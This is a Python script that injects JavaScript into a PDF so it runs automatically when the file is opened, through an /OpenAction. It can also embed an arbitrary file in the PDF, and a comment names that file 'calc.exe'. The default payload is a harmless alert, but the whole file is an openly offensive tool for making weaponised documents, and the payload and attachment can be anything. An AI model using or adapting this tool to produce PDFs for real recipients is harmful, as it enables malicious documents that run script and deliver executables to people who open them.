import argparse
import os
from PyPDF2 import PdfReader, PdfWriter
from PyPDF2.generic import (
    DictionaryObject,
    NameObject,
    TextStringObject,
    DecodedStreamObject,
    ArrayObject
)

def inject_js(input_path, output_path, js_payload, embed_path=None):
    reader = PdfReader(input_path)
    writer = PdfWriter()

    for page in reader.pages:
        writer.add_page(page)

    if embed_path:
        file_name = os.path.basename(embed_path)  # <- ensures it's "calc.exe"
        with open(embed_path, "rb") as f:
            file_data = f.read()

        ef_stream = DecodedStreamObject()
        ef_stream.set_data(file_data)
        ef_stream.update({
            NameObject("/Type"): NameObject("/EmbeddedFile")
        })
        ef_stream_ref = writer._add_object(ef_stream)

        filespec = DictionaryObject()
        filespec.update({
            NameObject("/Type"): NameObject("/Filespec"),
            NameObject("/F"): TextStringObject(file_name),
            NameObject("/EF"): DictionaryObject({
                NameObject("/F"): ef_stream_ref
            }),
            NameObject("/UF"): TextStringObject(file_name)
        })
        filespec_ref = writer._add_object(filespec)

        writer._root_object.update({
            NameObject("/Names"): DictionaryObject({
                NameObject("/EmbeddedFiles"): DictionaryObject({
                    NameObject("/Names"): ArrayObject([
                        TextStringObject(file_name),
                        filespec_ref
                    ])
                })
            })
        })

    js_action = DictionaryObject()
    js_action.update({
        NameObject("/Type"): NameObject("/Action"),
        NameObject("/S"): NameObject("/JavaScript"),
        NameObject("/JS"): TextStringObject(js_payload)
    })

    action_ref = writer._add_object(js_action)
    writer._root_object.update({NameObject("/OpenAction"): action_ref})

    with open(output_path, "wb") as f:
        writer.write(f)

    print(f"[+] PDF saved to: {output_path}")
    if embed_path:
        print(f"[+] Embedded file: {file_name}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--input", "-i", required=True)
    parser.add_argument("--output", "-o", required=True)
    parser.add_argument("--payload", "-p", default='app.alert("PDF viewer allows XSS");')
    parser.add_argument("--embed", "-e", help="Path to file to embed")
    args = parser.parse_args()

    inject_js(args.input, args.output, args.payload, args.embed if args.embed else None)
